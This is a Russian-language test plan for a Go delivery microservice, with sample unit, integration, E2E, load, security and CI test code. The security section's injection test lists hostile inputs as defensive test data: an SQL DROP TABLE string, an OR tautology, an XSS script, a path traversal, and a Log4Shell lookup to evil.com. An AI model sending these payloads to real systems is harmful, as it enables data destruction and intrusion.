# 🧪 DELIVERY MICROSERVICE - ДЕТАЛЬНЫЙ ПЛАН ТЕСТИРОВАНИЯ

**Дата создания**: 2025-10-23
**Версия**: 1.0
**Статус**: Production Ready Testing Strategy
**Микросервис**: `github.com/sveturs/delivery`

---

## 📋 СОДЕРЖАНИЕ

1. [Обзор стратегии тестирования](#обзор-стратегии-тестирования)
2. [Уровни тестирования](#уровни-тестирования)
3. [Unit тесты](#unit-тесты)
4. [Integration тесты](#integration-тесты)
5. [E2E тесты](#e2e-тесты)
6. [Load и Performance тесты](#load-и-performance-тесты)
7. [Security тесты](#security-тесты)
8. [Тестовые сценарии по методам](#тестовые-сценарии-по-методам)
9. [Тестирование провайдеров](#тестирование-провайдеров)
10. [CI/CD интеграция](#cicd-интеграция)
11. [Метрики качества](#метрики-качества)

---

## 🎯 ОБЗОР СТРАТЕГИИ ТЕСТИРОВАНИЯ

### Цели тестирования:
1. ✅ **Функциональная корректность** - все методы работают согласно спецификации
2. ✅ **Производительность** - микросервис выдерживает нагрузку production
3. ✅ **Надежность** - graceful degradation при сбоях провайдеров
4. ✅ **Безопасность** - защита от атак и утечек данных
5. ✅ **Совместимость** - корректная работа с всеми провайдерами

### Пирамида тестирования:
```
        /\
       /  \      E2E тесты (5%)
      /    \     - Полный flow через gRPC
     /------\
    /        \   Integration тесты (25%)
   /          \  - База данных, Redis, провайдеры
  /------------\
 /              \ Unit тесты (70%)
/________________\ - Бизнес-логика, валидация, расчеты
```

### Тестовое окружение:

| Окружение | Назначение | База данных | Провайдеры |
|-----------|-----------|-------------|-----------|
| **Local** | Разработка | PostgreSQL + PostGIS | Mock |
| **CI** | Автоматические тесты | Testcontainers | Mock |
| **Staging** | Pre-production | Staging DB | Mock + Sandbox API |
| **Production** | Monitoring tests | Production DB | Real API |

---

## 📊 УРОВНИ ТЕСТИРОВАНИЯ

### 1. Unit тесты (70% покрытия)

**Цель**: Тестирование изолированных компонентов

**Что тестируем:**
- ✅ Бизнес-логика калькулятора стоимости
- ✅ Валидация входных данных
- ✅ Генерация tracking numbers
- ✅ JSONB marshaling/unmarshaling
- ✅ Domain models (Address, Package, Shipment)
- ✅ Provider factory
- ✅ Rate calculation logic

**Инструменты:**
- `testing` (стандартная библиотека Go)
- `github.com/stretchr/testify` (assertions)
- `github.com/golang/mock` (mocking)

**Пример структуры:**
```
internal/
├── domain/
│   ├── provider_test.go          # JSONB, models
│   ├── shipment_test.go          # Shipment business logic
│   └── address_test.go           # Address validation
├── service/
│   ├── calculator_test.go        # Rate calculation
│   ├── validator_test.go         # Input validation
│   └── tracking_generator_test.go # Tracking numbers
└── storage/
    └── postgres/
        └── repository_test.go    # Repository logic (with mocks)
```

### 2. Integration тесты (25% покрытия)

**Цель**: Тестирование взаимодействия между компонентами

**Что тестируем:**
- ✅ База данных (PostgreSQL + PostGIS)
- ✅ Redis кэширование
- ✅ gRPC сервер
- ✅ Провайдеры (mock)
- ✅ Транзакции БД
- ✅ Конкурентный доступ

**Инструменты:**
- `github.com/testcontainers/testcontainers-go` (Docker для БД)
- `github.com/DATA-DOG/go-sqlmock` (mock БД для быстрых тестов)
- Real PostgreSQL + PostGIS container

**Пример структуры:**
```
tests/
├── integration/
│   ├── database_test.go          # Тесты БД с Testcontainers
│   ├── cache_test.go             # Redis интеграция
│   ├── grpc_server_test.go       # gRPC server tests
│   └── provider_integration_test.go # Mock провайдеры
└── fixtures/
    ├── test_shipments.sql
    ├── test_providers.sql
    └── test_addresses.sql
```

### 3. E2E тесты (5% покрытия)

**Цель**: Тестирование полного flow как в production

**Что тестируем:**
- ✅ Полный lifecycle отправки (Create → Track → Cancel)
- ✅ Multi-provider scenarios
- ✅ Webhook обработка
- ✅ Error handling и retry logic

**Инструменты:**
- gRPC клиент (Go)
- `grpcurl` (CLI тестирование)
- Real containers (Docker Compose)

---

## 🧪 UNIT ТЕСТЫ

### 1. Domain Models Tests

#### `internal/domain/provider_test.go`
```go
package domain_test

import (
    "testing"
    "github.com/stretchr/testify/assert"
    "backend/internal/domain"
)

func TestJSONB_Value(t *testing.T) {
    tests := []struct {
        name    string
        input   domain.JSONB
        want    []byte
        wantErr bool
    }{
        {
            name:    "Valid JSON object",
            input:   domain.JSONB(`{"key":"value"}`),
            want:    []byte(`{"key":"value"}`),
            wantErr: false,
        },
        {
            name:    "Empty JSONB",
            input:   domain.JSONB(nil),
            want:    nil,
            wantErr: false,
        },
        {
            name:    "Valid JSON array",
            input:   domain.JSONB(`[1,2,3]`),
            want:    []byte(`[1,2,3]`),
            wantErr: false,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            got, err := tt.input.Value()
            if tt.wantErr {
                assert.Error(t, err)
            } else {
                assert.NoError(t, err)
                assert.Equal(t, tt.want, got)
            }
        })
    }
}

func TestJSONB_Scan(t *testing.T) {
    tests := []struct {
        name    string
        input   interface{}
        want    domain.JSONB
        wantErr bool
    }{
        {
            name:    "Scan from []byte",
            input:   []byte(`{"test":true}`),
            want:    domain.JSONB(`{"test":true}`),
            wantErr: false,
        },
        {
            name:    "Scan from nil",
            input:   nil,
            want:    nil,
            wantErr: false,
        },
        {
            name:    "Scan from invalid type",
            input:   "string",
            wantErr: true,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            var j domain.JSONB
            err := j.Scan(tt.input)
            if tt.wantErr {
                assert.Error(t, err)
            } else {
                assert.NoError(t, err)
                assert.Equal(t, tt.want, j)
            }
        })
    }
}
```

#### `internal/domain/address_test.go`
```go
package domain_test

import (
    "testing"
    "github.com/stretchr/testify/assert"
    "backend/internal/domain"
)

func TestAddress_Validate(t *testing.T) {
    tests := []struct {
        name    string
        address domain.Address
        wantErr bool
        errMsg  string
    }{
        {
            name: "Valid address",
            address: domain.Address{
                Street:       "Kneza Milosa 10",
                City:         "Belgrade",
                PostalCode:   "11000",
                Country:      "RS",
                ContactName:  "John Doe",
                ContactPhone: "+381611234567",
            },
            wantErr: false,
        },
        {
            name: "Missing street",
            address: domain.Address{
                City:        "Belgrade",
                PostalCode:  "11000",
                Country:     "RS",
            },
            wantErr: true,
            errMsg:  "street is required",
        },
        {
            name: "Invalid postal code format",
            address: domain.Address{
                Street:      "Test St",
                City:        "Belgrade",
                PostalCode:  "INVALID",
                Country:     "RS",
            },
            wantErr: true,
            errMsg:  "invalid postal code",
        },
        {
            name: "Invalid country code",
            address: domain.Address{
                Street:     "Test St",
                City:       "Belgrade",
                PostalCode: "11000",
                Country:    "INVALID",
            },
            wantErr: true,
            errMsg:  "invalid country code",
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            err := tt.address.Validate()
            if tt.wantErr {
                assert.Error(t, err)
                assert.Contains(t, err.Error(), tt.errMsg)
            } else {
                assert.NoError(t, err)
            }
        })
    }
}
```

### 2. Service Layer Tests

#### `internal/service/calculator_test.go`
```go
package service_test

import (
    "context"
    "testing"
    "github.com/stretchr/testify/assert"
    "backend/internal/service"
    "backend/internal/domain"
)

func TestRateCalculator_Calculate(t *testing.T) {
    calc := service.NewRateCalculator()

    tests := []struct {
        name          string
        from          domain.Address
        to            domain.Address
        pkg           domain.Package
        provider      domain.DeliveryProvider
        expectedRange [2]float64 // min, max
    }{
        {
            name: "Belgrade to Novi Sad - small package",
            from: domain.Address{City: "Belgrade", Country: "RS"},
            to:   domain.Address{City: "Novi Sad", Country: "RS"},
            pkg: domain.Package{
                Weight: 1.0,
                Length: 30,
                Width:  20,
                Height: 10,
            },
            provider:      domain.DeliveryProviderPostExpress,
            expectedRange: [2]float64{150.0, 250.0},
        },
        {
            name: "Long distance - heavy package",
            from: domain.Address{City: "Belgrade", Country: "RS"},
            to:   domain.Address{City: "Subotica", Country: "RS"},
            pkg: domain.Package{
                Weight: 25.0,
                Length: 100,
                Width:  50,
                Height: 30,
            },
            provider:      domain.DeliveryProviderPostExpress,
            expectedRange: [2]float64{800.0, 1500.0},
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            cost, err := calc.Calculate(context.Background(), tt.from, tt.to, tt.pkg, tt.provider)
            assert.NoError(t, err)
            assert.GreaterOrEqual(t, cost, tt.expectedRange[0])
            assert.LessOrEqual(t, cost, tt.expectedRange[1])
        })
    }
}
```

#### `internal/service/tracking_generator_test.go`
```go
package service_test

import (
    "testing"
    "github.com/stretchr/testify/assert"
    "backend/internal/service"
    "backend/internal/domain"
    "regexp"
)

func TestTrackingGenerator_Generate(t *testing.T) {
    gen := service.NewTrackingGenerator()

    tests := []struct {
        name     string
        provider domain.DeliveryProvider
        pattern  string // regex pattern
    }{
        {
            name:     "Post Express tracking number",
            provider: domain.DeliveryProviderPostExpress,
            pattern:  `^post_express-\d{10}-\d{4}$`,
        },
        {
            name:     "BEX tracking number",
            provider: domain.DeliveryProviderBEX,
            pattern:  `^bex-\d{10}-\d{4}$`,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            tracking := gen.Generate(tt.provider)
            assert.NotEmpty(t, tracking)
            assert.Regexp(t, regexp.MustCompile(tt.pattern), tracking)
        })
    }
}

func TestTrackingGenerator_Uniqueness(t *testing.T) {
    gen := service.NewTrackingGenerator()
    provider := domain.DeliveryProviderPostExpress

    // Генерируем 1000 номеров и проверяем уникальность
    seen := make(map[string]bool)
    for i := 0; i < 1000; i++ {
        tracking := gen.Generate(provider)
        assert.False(t, seen[tracking], "Duplicate tracking number: %s", tracking)
        seen[tracking] = true
    }
}
```

---

## 🔗 INTEGRATION ТЕСТЫ

### 1. Database Integration Tests

#### `tests/integration/database_test.go`
```go
package integration_test

import (
    "context"
    "testing"
    "github.com/stretchr/testify/suite"
    "github.com/testcontainers/testcontainers-go"
    "github.com/testcontainers/testcontainers-go/wait"
    "backend/internal/storage/postgres"
    "backend/internal/domain"
)

type DatabaseTestSuite struct {
    suite.Suite
    container testcontainers.Container
    repo      *postgres.Repository
    ctx       context.Context
}

func (s *DatabaseTestSuite) SetupSuite() {
    s.ctx = context.Background()

    // Запускаем PostgreSQL + PostGIS контейнер
    req := testcontainers.ContainerRequest{
        Image:        "postgis/postgis:17-3.5",
        ExposedPorts: []string{"5432/tcp"},
        Env: map[string]string{
            "POSTGRES_DB":       "delivery_test",
            "POSTGRES_USER":     "test",
            "POSTGRES_PASSWORD": "test",
        },
        WaitingFor: wait.ForLog("database system is ready to accept connections"),
    }

    container, err := testcontainers.GenericContainer(s.ctx, testcontainers.GenericContainerRequest{
        ContainerRequest: req,
        Started:          true,
    })
    s.Require().NoError(err)
    s.container = container

    // Получаем connection string
    host, _ := container.Host(s.ctx)
    port, _ := container.MappedPort(s.ctx, "5432")
    connStr := fmt.Sprintf("postgres://test:test@%s:%s/delivery_test?sslmode=disable", host, port.Port())

    // Создаем repository
    s.repo, err = postgres.NewRepository(connStr)
    s.Require().NoError(err)

    // Применяем миграции
    err = s.repo.Migrate()
    s.Require().NoError(err)
}

func (s *DatabaseTestSuite) TearDownSuite() {
    s.container.Terminate(s.ctx)
}

func (s *DatabaseTestSuite) TestCreateShipment() {
    shipment := &domain.Shipment{
        TrackingNumber: "test-12345",
        Provider:       domain.DeliveryProviderPostExpress,
        Status:         domain.ShipmentStatusConfirmed,
        FromAddress: domain.Address{
            Street:     "Test St 1",
            City:       "Belgrade",
            PostalCode: "11000",
            Country:    "RS",
        },
        ToAddress: domain.Address{
            Street:     "Test St 2",
            City:       "Novi Sad",
            PostalCode: "21000",
            Country:    "RS",
        },
        Package: domain.Package{
            Weight: 1.5,
            Length: 30,
            Width:  20,
            Height: 10,
        },
        Cost:     200.0,
        Currency: "RSD",
    }

    // Создаем shipment
    err := s.repo.CreateShipment(s.ctx, shipment)
    s.Require().NoError(err)
    s.NotZero(shipment.ID)

    // Проверяем что можем получить обратно
    retrieved, err := s.repo.GetShipmentByID(s.ctx, shipment.ID)
    s.Require().NoError(err)
    s.Equal(shipment.TrackingNumber, retrieved.TrackingNumber)
    s.Equal(shipment.Provider, retrieved.Provider)
    s.Equal(shipment.Status, retrieved.Status)
}

func (s *DatabaseTestSuite) TestJSONBPersistence() {
    // Тест сохранения и чтения JSONB полей
    shipment := &domain.Shipment{
        TrackingNumber: "jsonb-test-12345",
        Provider:       domain.DeliveryProviderPostExpress,
        Status:         domain.ShipmentStatusConfirmed,
        // ... адреса и package с различными данными
    }

    err := s.repo.CreateShipment(s.ctx, shipment)
    s.Require().NoError(err)

    retrieved, err := s.repo.GetShipmentByID(s.ctx, shipment.ID)
    s.Require().NoError(err)

    // Проверяем что JSONB поля десериализовались корректно
    s.Equal(shipment.FromAddress.Street, retrieved.FromAddress.Street)
    s.Equal(shipment.Package.Weight, retrieved.Package.Weight)
}

func TestDatabaseSuite(t *testing.T) {
    suite.Run(t, new(DatabaseTestSuite))
}
```

### 2. gRPC Server Integration Tests

#### `tests/integration/grpc_server_test.go`
```go
package integration_test

import (
    "context"
    "testing"
    "google.golang.org/grpc"
    "google.golang.org/grpc/credentials/insecure"
    "github.com/stretchr/testify/assert"
    pb "backend/proto/delivery/v1"
)

func TestGRPCServer_FullFlow(t *testing.T) {
    // Подключаемся к тестовому gRPC серверу
    conn, err := grpc.Dial("localhost:50052",
        grpc.WithTransportCredentials(insecure.NewCredentials()))
    assert.NoError(t, err)
    defer conn.Close()

    client := pb.NewDeliveryServiceClient(conn)
    ctx := context.Background()

    // 1. CalculateRate
    rateReq := &pb.CalculateRateRequest{
        Provider: pb.DeliveryProvider_DELIVERY_PROVIDER_POST_EXPRESS,
        FromAddress: &pb.Address{
            Street:     "Kneza Milosa 10",
            City:       "Belgrade",
            PostalCode: "11000",
            Country:    "RS",
        },
        ToAddress: &pb.Address{
            Street:     "Bulevar Oslobodjenja 1",
            City:       "Novi Sad",
            PostalCode: "21000",
            Country:    "RS",
        },
        Package: &pb.Package{
            Weight: "1.0",
            Length: "30",
            Width:  "20",
            Height: "10",
        },
    }

    rateResp, err := client.CalculateRate(ctx, rateReq)
    assert.NoError(t, err)
    assert.NotEmpty(t, rateResp.Cost)
    assert.Equal(t, "RSD", rateResp.Currency)

    // 2. CreateShipment
    shipmentReq := &pb.CreateShipmentRequest{
        Provider:    pb.DeliveryProvider_DELIVERY_PROVIDER_POST_EXPRESS,
        FromAddress: rateReq.FromAddress,
        ToAddress:   rateReq.ToAddress,
        Package:     rateReq.Package,
        UserId:      "test-user-123",
    }

    shipmentResp, err := client.CreateShipment(ctx, shipmentReq)
    assert.NoError(t, err)
    assert.NotEmpty(t, shipmentResp.Shipment.Id)
    assert.NotEmpty(t, shipmentResp.Shipment.TrackingNumber)
    assert.Equal(t, pb.ShipmentStatus_SHIPMENT_STATUS_CONFIRMED, shipmentResp.Shipment.Status)

    shipmentID := shipmentResp.Shipment.Id
    trackingNumber := shipmentResp.Shipment.TrackingNumber

    // 3. GetShipment
    getReq := &pb.GetShipmentRequest{Id: shipmentID}
    getResp, err := client.GetShipment(ctx, getReq)
    assert.NoError(t, err)
    assert.Equal(t, shipmentID, getResp.Shipment.Id)
    assert.Equal(t, trackingNumber, getResp.Shipment.TrackingNumber)

    // 4. TrackShipment
    trackReq := &pb.TrackShipmentRequest{TrackingNumber: trackingNumber}
    trackResp, err := client.TrackShipment(ctx, trackReq)
    assert.NoError(t, err)
    assert.NotEmpty(t, trackResp.Shipment)
    assert.NotEmpty(t, trackResp.Events)

    // 5. CancelShipment
    cancelReq := &pb.CancelShipmentRequest{
        Id:     shipmentID,
        Reason: "Integration test cancellation",
    }
    cancelResp, err := client.CancelShipment(ctx, cancelReq)
    assert.NoError(t, err)
    assert.Equal(t, pb.ShipmentStatus_SHIPMENT_STATUS_CANCELLED, cancelResp.Shipment.Status)
}
```

---

## 🚀 E2E ТЕСТЫ

### 1. Full Lifecycle Test

#### `tests/e2e/full_lifecycle_test.go`
```go
package e2e_test

import (
    "context"
    "testing"
    "time"
    "github.com/stretchr/testify/assert"
    pb "backend/proto/delivery/v1"
)

func TestFullDeliveryLifecycle(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping E2E test in short mode")
    }

    client := setupE2EClient(t)
    ctx := context.Background()

    // Сценарий: Пользователь заказывает доставку, отслеживает, затем отменяет

    // 1. Расчет стоимости
    t.Log("Step 1: Calculate delivery rate")
    rate, err := client.CalculateRate(ctx, createRateRequest())
    assert.NoError(t, err)
    t.Logf("Rate calculated: %s %s", rate.Cost, rate.Currency)

    // 2. Создание shipment
    t.Log("Step 2: Create shipment")
    shipment, err := client.CreateShipment(ctx, createShipmentRequest())
    assert.NoError(t, err)
    t.Logf("Shipment created: ID=%s, Tracking=%s",
        shipment.Shipment.Id, shipment.Shipment.TrackingNumber)

    // 3. Проверка статуса (сразу после создания)
    t.Log("Step 3: Check initial status")
    status, err := client.GetShipment(ctx, &pb.GetShipmentRequest{
        Id: shipment.Shipment.Id,
    })
    assert.NoError(t, err)
    assert.Equal(t, pb.ShipmentStatus_SHIPMENT_STATUS_CONFIRMED, status.Shipment.Status)

    // 4. Симуляция ожидания и отслеживание
    t.Log("Step 4: Wait and track shipment progress")
    time.Sleep(2 * time.Second)

    tracking, err := client.TrackShipment(ctx, &pb.TrackShipmentRequest{
        TrackingNumber: shipment.Shipment.TrackingNumber,
    })
    assert.NoError(t, err)
    assert.NotEmpty(t, tracking.Events)
    t.Logf("Tracking events: %d", len(tracking.Events))

    // 5. Отмена shipment
    t.Log("Step 5: Cancel shipment")
    cancelled, err := client.CancelShipment(ctx, &pb.CancelShipmentRequest{
        Id:     shipment.Shipment.Id,
        Reason: "E2E test - order cancelled by customer",
    })
    assert.NoError(t, err)
    assert.Equal(t, pb.ShipmentStatus_SHIPMENT_STATUS_CANCELLED, cancelled.Shipment.Status)

    // 6. Финальная проверка статуса
    t.Log("Step 6: Verify final cancelled status")
    finalStatus, err := client.GetShipment(ctx, &pb.GetShipmentRequest{
        Id: shipment.Shipment.Id,
    })
    assert.NoError(t, err)
    assert.Equal(t, pb.ShipmentStatus_SHIPMENT_STATUS_CANCELLED, finalStatus.Shipment.Status)

    t.Log("E2E test completed successfully")
}
```

---

## 📈 LOAD И PERFORMANCE ТЕСТЫ

### 1. Load Testing с k6

#### `tests/load/load_test.js`
```javascript
import grpc from 'k6/net/grpc';
import { check, sleep } from 'k6';

const client = new grpc.Client();
client.load(['proto'], 'delivery.proto');

export let options = {
    stages: [
        { duration: '2m', target: 100 },  // Ramp-up to 100 users
        { duration: '5m', target: 100 },  // Stay at 100 users
        { duration: '2m', target: 200 },  // Ramp-up to 200 users
        { duration: '5m', target: 200 },  // Stay at 200 users
        { duration: '2m', target: 0 },    // Ramp-down to 0 users
    ],
    thresholds: {
        'grpc_req_duration{method="CalculateRate"}': ['p(95)<500'], // 95% requests < 500ms
        'grpc_req_duration{method="CreateShipment"}': ['p(95)<1000'], // 95% requests < 1s
        grpc_req_failed: ['rate<0.01'], // Error rate < 1%
    },
};

export default () => {
    client.connect('localhost:50052', {
        plaintext: true,
    });

    // CalculateRate request
    const rateResponse = client.invoke('delivery.v1.DeliveryService/CalculateRate', {
        provider: 'DELIVERY_PROVIDER_POST_EXPRESS',
        from_address: {
            street: 'Kneza Milosa 10',
            city: 'Belgrade',
            postal_code: '11000',
            country: 'RS',
        },
        to_address: {
            street: 'Bulevar Oslobodjenja 1',
            city: 'Novi Sad',
            postal_code: '21000',
            country: 'RS',
        },
        package: {
            weight: '1.0',
            length: '30',
            width: '20',
            height: '10',
        },
    });

    check(rateResponse, {
        'CalculateRate status is OK': (r) => r && r.status === grpc.StatusOK,
        'CalculateRate has cost': (r) => r && r.message.cost !== '',
    });

    sleep(1);

    client.close();
};
```

**Запуск load тестов:**
```bash
# Установка k6 (если не установлен)
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69
echo "deb https://dl.k6.io/deb stable main" | sudo tee /etc/apt/sources.list.d/k6.list
sudo apt-get update
sudo apt-get install k6

# Запуск load теста
k6 run tests/load/load_test.js

# Запуск с визуализацией (InfluxDB + Grafana)
k6 run --out influxdb=http://localhost:8086/k6 tests/load/load_test.js
```

### 2. Benchmark тесты (Go)

#### `tests/benchmark/benchmark_test.go`
```go
package benchmark_test

import (
    "context"
    "testing"
    "backend/internal/service"
    "backend/internal/domain"
)

func BenchmarkCalculateRate(b *testing.B) {
    calc := service.NewRateCalculator()
    ctx := context.Background()

    from := domain.Address{City: "Belgrade", Country: "RS"}
    to := domain.Address{City: "Novi Sad", Country: "RS"}
    pkg := domain.Package{Weight: 1.0, Length: 30, Width: 20, Height: 10}
    provider := domain.DeliveryProviderPostExpress

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        _, _ = calc.Calculate(ctx, from, to, pkg, provider)
    }
}

func BenchmarkTrackingNumberGeneration(b *testing.B) {
    gen := service.NewTrackingGenerator()
    provider := domain.DeliveryProviderPostExpress

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        _ = gen.Generate(provider)
    }
}
```

**Запуск benchmark:**
```bash
# Запуск benchmark тестов
cd tests/benchmark
go test -bench=. -benchmem -benchtime=10s

# Сохранение результатов
go test -bench=. -benchmem > bench_results.txt

# Сравнение результатов
benchstat bench_old.txt bench_new.txt
```

---

## 🔒 SECURITY ТЕСТЫ

### 1. Authentication & Authorization Tests

#### `tests/security/auth_test.go`
```go
package security_test

import (
    "context"
    "testing"
    "google.golang.org/grpc/codes"
    "google.golang.org/grpc/status"
    "github.com/stretchr/testify/assert"
    pb "backend/proto/delivery/v1"
)

func TestUnauthorizedAccess(t *testing.T) {
    client := setupUnauthenticatedClient(t)
    ctx := context.Background()

    // Попытка создать shipment без токена
    req := &pb.CreateShipmentRequest{
        Provider: pb.DeliveryProvider_DELIVERY_PROVIDER_POST_EXPRESS,
        // ... остальные поля
    }

    _, err := client.CreateShipment(ctx, req)
    assert.Error(t, err)

    st, ok := status.FromError(err)
    assert.True(t, ok)
    assert.Equal(t, codes.Unauthenticated, st.Code())
}

func TestInvalidToken(t *testing.T) {
    client := setupClientWithToken(t, "invalid-token")
    ctx := context.Background()

    req := &pb.GetShipmentRequest{Id: "1"}
    _, err := client.GetShipment(ctx, req)

    assert.Error(t, err)
    st, ok := status.FromError(err)
    assert.True(t, ok)
    assert.Equal(t, codes.Unauthenticated, st.Code())
}

func TestAccessOtherUserShipment(t *testing.T) {
    // User A создает shipment
    clientA := setupAuthenticatedClient(t, "user-a-token")
    ctx := context.Background()

    shipment, err := clientA.CreateShipment(ctx, createTestShipmentRequest("user-a"))
    assert.NoError(t, err)

    // User B пытается получить shipment User A
    clientB := setupAuthenticatedClient(t, "user-b-token")
    _, err = clientB.GetShipment(ctx, &pb.GetShipmentRequest{
        Id: shipment.Shipment.Id,
    })

    assert.Error(t, err)
    st, ok := status.FromError(err)
    assert.True(t, ok)
    assert.Equal(t, codes.PermissionDenied, st.Code())
}
```

### 2. Rate Limiting Tests

#### `tests/security/rate_limit_test.go`
```go
package security_test

import (
    "context"
    "testing"
    "time"
    "google.golang.org/grpc/codes"
    "google.golang.org/grpc/status"
    "github.com/stretchr/testify/assert"
    pb "backend/proto/delivery/v1"
)

func TestRateLimitExceeded(t *testing.T) {
    client := setupAuthenticatedClient(t, "test-user-token")
    ctx := context.Background()

    req := &pb.CalculateRateRequest{
        // ... test data
    }

    // Делаем 100 запросов быстро
    var lastErr error
    for i := 0; i < 100; i++ {
        _, lastErr = client.CalculateRate(ctx, req)
    }

    // Ожидаем rate limit error
    assert.Error(t, lastErr)
    st, ok := status.FromError(lastErr)
    assert.True(t, ok)
    assert.Equal(t, codes.ResourceExhausted, st.Code())
}

func TestRateLimitRecovery(t *testing.T) {
    client := setupAuthenticatedClient(t, "test-user-token")
    ctx := context.Background()

    req := &pb.CalculateRateRequest{/* ... */}

    // Превышаем лимит
    for i := 0; i < 100; i++ {
        client.CalculateRate(ctx, req)
    }

    // Ждем recovery (60 секунд window)
    time.Sleep(61 * time.Second)

    // Проверяем что запросы снова работают
    _, err := client.CalculateRate(ctx, req)
    assert.NoError(t, err)
}
```

### 3. Input Validation & Injection Tests

#### `tests/security/injection_test.go`
```go
package security_test

import (
    "context"
    "testing"
    "github.com/stretchr/testify/assert"
    pb "backend/proto/delivery/v1"
)

func TestSQLInjectionAttempts(t *testing.T) {
    client := setupAuthenticatedClient(t, "test-token")
    ctx := context.Background()

    maliciousInputs := []string{
        "'; DROP TABLE shipments; --",
        "1' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
    }

    for _, input := range maliciousInputs {
        t.Run(input, func(t *testing.T) {
            req := &pb.GetShipmentRequest{Id: input}
            _, err := client.GetShipment(ctx, req)

            // Должна быть validation error, а не SQL error
            assert.Error(t, err)
            assert.NotContains(t, err.Error(), "SQL")
            assert.NotContains(t, err.Error(), "syntax")
        })
    }
}
```

---

## 🎯 ТЕСТОВЫЕ СЦЕНАРИИ ПО МЕТОДАМ

### CalculateRate Method

| # | Сценарий | Входные данные | Ожидаемый результат |
|---|----------|----------------|---------------------|
| 1 | Нормальный расчет (короткое расстояние) | Belgrade → Novi Sad, 1kg | 150-250 RSD, ~1 день |
| 2 | Нормальный расчет (длинное расстояние) | Belgrade → Subotica, 5kg | 500-800 RSD, ~2-3 дня |
| 3 | Тяжелая посылка | 25kg | Корректный расчет, ~2-3 дня |
| 4 | Крупногабаритная посылка | 100x50x30cm | Увеличенная стоимость |
| 5 | Минимальный вес | 0.1kg | Корректный расчет |
| 6 | Отрицательный вес | -1kg | Validation error |
| 7 | Пустой адрес | Empty street | Validation error |
| 8 | Неизвестный провайдер | INVALID_PROVIDER | Error: unknown provider |
| 9 | Одинаковые адреса | Belgrade → Belgrade | Минимальная стоимость |
| 10 | Кэширование | Повторный запрос | Быстрый ответ из кэша |

### CreateShipment Method

| # | Сценарий | Входные данные | Ожидаемый результат |
|---|----------|----------------|---------------------|
| 1 | Нормальное создание | Валидные данные | Shipment created, status CONFIRMED |
| 2 | Без user_id | Empty user_id | Validation error |
| 3 | Невалидный адрес | Invalid postal code | Validation error |
| 4 | Duplicate tracking number | Существующий tracking | Новый уникальный tracking |
| 5 | JSONB persistence | Комплексные адреса | Корректное сохранение JSONB |
| 6 | Transaction rollback | Database error mid-transaction | Rollback, no partial data |
| 7 | Provider API failure | Post Express down | Graceful error, retry later |
| 8 | Declared value слишком большой | 1,000,000 RSD | Требуется страховка |

### TrackShipment Method

| # | Сценарий | Входные данные | Ожидаемый результат |
|---|----------|----------------|---------------------|
| 1 | Отслеживание существующего | Валидный tracking number | История событий |
| 2 | Несуществующий tracking | "INVALID-123" | Error: not found |
| 3 | Tracking после cancel | Cancelled shipment | История с cancel event |
| 4 | Webhook обновления | Новые события от провайдера | Обновленная история |
| 5 | Mock provider прогресс | Mock shipment | События симулируются |

---

## 🚚 ТЕСТИРОВАНИЕ ПРОВАЙДЕРОВ

### Mock Provider Tests

```go
func TestMockProvider_Lifecycle(t *testing.T) {
    provider := NewMockProvider()

    // 1. Создание shipment
    shipment, err := provider.CreateShipment(createTestData())
    assert.NoError(t, err)
    assert.NotEmpty(t, shipment.TrackingNumber)

    // 2. Tracking - сразу после создания
    status1, err := provider.TrackShipment(shipment.TrackingNumber)
    assert.NoError(t, err)
    assert.Equal(t, StatusConfirmed, status1)

    // 3. Симуляция прогресса
    time.Sleep(1 * time.Second)
    status2, err := provider.TrackShipment(shipment.TrackingNumber)
    assert.NoError(t, err)
    // Mock должен показать прогресс
    assert.NotEqual(t, status1, status2)

    // 4. Отмена
    err = provider.CancelShipment(shipment.TrackingNumber)
    assert.NoError(t, err)

    // 5. Проверка cancelled статуса
    statusFinal, err := provider.TrackShipment(shipment.TrackingNumber)
    assert.NoError(t, err)
    assert.Equal(t, StatusCancelled, statusFinal)
}
```

### Real Provider Integration Tests (Sandbox)

```go
func TestPostExpressSandbox_RealAPI(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping real API test")
    }

    // Используем sandbox credentials
    provider := NewPostExpressProvider(PostExpressConfig{
        APIKey:  os.Getenv("POST_EXPRESS_SANDBOX_KEY"),
        BaseURL: "https://sandbox.api.postexpress.rs",
    })

    // Тест с реальным API (sandbox)
    rate, err := provider.CalculateRate(createTestRateRequest())
    assert.NoError(t, err)
    assert.NotZero(t, rate.Cost)

    t.Logf("Sandbox API response: %+v", rate)
}
```

---

## 🔄 CI/CD ИНТЕГРАЦИЯ

### GitHub Actions Workflow

#### `.github/workflows/test.yml`
```yaml
name: Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.23'

      - name: Run unit tests
        run: |
          cd backend
          go test -v -race -coverprofile=coverage.out ./...
          go tool cover -func=coverage.out

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage.out

  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgis/postgis:17-3.5
        env:
          POSTGRES_DB: delivery_test
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
        ports:
          - 5432:5432

      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v3

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.23'

      - name: Run integration tests
        run: |
          cd tests/integration
          go test -v -tags=integration ./...
        env:
          DATABASE_URL: postgres://test:test@localhost:5432/delivery_test?sslmode=disable
          REDIS_URL: redis://localhost:6379

  load-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v3

